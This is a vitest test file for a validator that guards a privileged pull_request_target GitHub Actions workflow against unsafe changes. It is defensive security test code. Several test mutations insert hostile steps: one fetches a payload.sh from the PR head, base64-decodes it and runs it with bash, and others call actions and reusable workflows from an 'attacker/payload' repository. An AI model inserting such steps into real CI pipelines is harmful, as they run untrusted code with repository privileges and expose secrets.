// SPDX-FileCopyrightText: Copyright (c) 2026 NVIDIA CORPORATION & AFFILIATES. All rights reserved.
// SPDX-License-Identifier: Apache-2.0

import fs from "node:fs";
import os from "node:os";
import path from "node:path";

import { describe, expect, it } from "vitest";

import { validateGrowthGuardrailsWorkflowBoundary } from "../tools/growth-guardrails/workflow-boundary.mts";

const ROOT = path.resolve(import.meta.dirname, "..");
const WORKFLOW_PATH = path.join(ROOT, ".github/workflows/codebase-growth-guardrails.yaml");

function workflowSource(): string {
  return fs.readFileSync(WORKFLOW_PATH, "utf8");
}

function validateMutation(mutate: (source: string) => string): string[] {
  const tmp = fs.mkdtempSync(path.join(os.tmpdir(), "growth-guardrails-boundary-"));
  const workflowPath = path.join(tmp, "workflow.yaml");
  fs.writeFileSync(workflowPath, mutate(workflowSource()));
  try {
    return validateGrowthGuardrailsWorkflowBoundary(workflowPath);
  } finally {
    fs.rmSync(tmp, { recursive: true, force: true });
  }
}

describe("growth-guardrails workflow trust boundary", () => {
  it("passes on the real workflow", () => {
    expect(validateGrowthGuardrailsWorkflowBoundary(WORKFLOW_PATH)).toEqual([]);
  });

  // source-shape-contract: security -- The pull_request_target guardrail must bind the exact trusted execution shape and reject unsafe trigger, permission, checkout, install, action, and shell mutations
  it.each([
    [
      "an untrusted pull_request trigger",
      (s: string) => s.replace("  pull_request_target:", "  pull_request:"),
      /must not trigger on pull_request/,
    ],
    [
      "a write permission scope",
      (s: string) => s.replace("  contents: read", "  contents: write"),
      /permission contents: write must be read or none/,
    ],
    [
      "a checkout of the PR head",
      (s: string) =>
        s.replace(
          "ref: ${{ github.event.pull_request.base.sha }}",
          "ref: ${{ github.event.pull_request.head.sha }}",
        ),
      /actions\/checkout ref must be/,
    ],
    [
      "a dependency install that runs PR scripts",
      (s: string) =>
        s.replace("npm ci --ignore-scripts --no-audit --no-fund", "npm ci --no-audit --no-fund"),
      /must use --ignore-scripts/,
    ],
    [
      "a dropped trusted tool invocation",
      (s: string) =>
        s.replace(
          "node --experimental-strip-types tools/growth-guardrails/test-conditionals.mts",
          "echo skip",
        ),
      /must invoke the trusted tool: .*test-conditionals\.mts/,
    ],
    [
      "a resurrected inline node heredoc",
      (s: string) =>
        s.replace(
          "node --experimental-strip-types tools/growth-guardrails/test-size-budget.mts",
          "node <<'NODE'\n          console.log(1)\n          NODE",
        ),
      /must match the approved shape/,
    ],
    [
      "a job-level write permission override",
      (s: string) =>
        s.replace(
          "    runs-on: ubuntu-latest\n",
          "    runs-on: ubuntu-latest\n    permissions:\n      contents: write\n",
        ),
      /job codebase-growth-guardrails permission contents: write must be read or none/,
    ],
    [
      "an appended PR-head payload execution in a trusted step",
      (s: string) =>
        s.replace(
          "node --experimental-strip-types tools/growth-guardrails/test-size-budget.mts",
          'node --experimental-strip-types tools/growth-guardrails/test-size-budget.mts\n          gh api "/repos/${HEAD_REPO}/contents/payload.sh?ref=${HEAD_SHA}" --jq .content | base64 -d > "$RUNNER_TEMP/payload.sh"\n          bash "$RUNNER_TEMP/payload.sh"',
        ),
      /must match the approved shape/,
    ],
    [
      "an arbitrary action step",
      (s: string) =>
        s.replace(
          "      - name: Check out the trusted base revision",
          "      - name: Execute an untrusted action\n        uses: attacker/payload@main\n\n      - name: Check out the trusted base revision",
        ),
      /must contain exactly 7 approved steps, not 8/,
    ],
    [
      "a non-approved shell field",
      (s: string) =>
        s.replace(
          "        run: npm ci --ignore-scripts --no-audit --no-fund",
          "        shell: python\n        run: npm ci --ignore-scripts --no-audit --no-fund",
        ),
      /must match the approved shape/,
    ],
    [
      "an extra reusable-workflow job",
      (s: string) =>
        `${s}\n  untrusted:\n    uses: attacker/payload/.github/workflows/run.yaml@main\n`,
      /workflow jobs must be exactly codebase-growth-guardrails/,
    ],
  ])("flags %s", (_label, mutate, pattern) => {
    expect(validateMutation(mutate).join("\n")).toMatch(pattern);
  });
});
